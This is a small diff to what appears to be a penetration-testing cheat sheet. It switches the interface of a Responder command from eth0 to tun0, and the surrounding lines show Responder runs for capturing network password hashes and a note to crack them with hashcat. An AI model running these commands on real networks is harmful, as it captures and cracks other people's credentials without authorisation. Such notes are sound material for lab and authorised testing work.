@@ -29,7 +29,7 @@ sudo responder -I tun0 -A
 sudo responder -I tun0 -wrf
 
 # -w and -P must be used seperately - For capturing hashes over L2 use -dPv
-sudo responder -I eth0 -dwPv
+sudo responder -I tun0 -dwPv
 ```
 
 Once the hash has been capture crack with hashcat.
